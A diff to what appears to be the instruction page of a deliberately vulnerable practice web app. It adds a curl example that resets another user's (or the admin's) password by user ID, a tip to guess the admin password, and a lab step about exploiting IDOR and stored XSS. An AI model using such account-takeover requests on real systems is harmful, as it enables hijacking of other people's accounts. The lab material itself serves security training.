@@ -171,7 +171,17 @@ curl -X POST "https://tarkash.surapura.in/api/upload" \\
      -F "file=@/path/to/your/file.jpg"
       </pre>
 
-      <p>&gt; Visit: https://tarkash.surapura.in/uploads/yourfile.jpg</p>
+      <br><br>
+
+    <p># Change other user’s password (admin as well)</p>
+    <p>&gt; Let’s say masino is user ID 8 :</p>
+      <pre>
+curl -X POST "https://tarkash.surapura.in/api/change-password \
+  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
+  -H "Content-Type: application/json" \
+  -d '{"user_id": 8, "new_password": "pwned-masino123"}'
+      </pre>
+      <p>&gt; also you can try to guess admin's pass and login</p>
     </section>
     <br>
     <section>
@@ -182,11 +192,18 @@ curl -X POST "https://tarkash.surapura.in/api/upload" \\
           <li>Step 3: Submit a form with a <code>message</code> field to <code>/api/form</code></li>
           <li>Step 4: View / Edit submitted forms via <code>/api/form?id=1</code> and exploit IDOR and stored XSS</li>
           <li>Step 5: Visit <code>/view-form?id=1</code> to render and trigger your payload (stored XSS)</li>
+          <li>Step 6: Change user's password with <code>new_password</code> and user id</li>
       </ul>
       <p>&gt; POP that XSS</p>
       <p>&gt; submit form with id=0</p>
     </section>
 
+    <section class="img-row">
+      <img src="/home/ikajakam/lab/poc/pop.png" alt="XSS Payload Screenshot" />
+      <img src="/home/ikajakam/lab/poc/pop2.png" alt="Form Submission Screenshot" />
+      <img src="/home/ikajakam/lab/poc/3.png" alt="Form Submission Screenshot" />
+      <img src="/home/ikajakam/lab/poc/4.png" alt="Form Submission Screenshot" />
+    </section>
 
     <hr style='width: 100%' />
     <p>Need help solving or have a query? Contact:
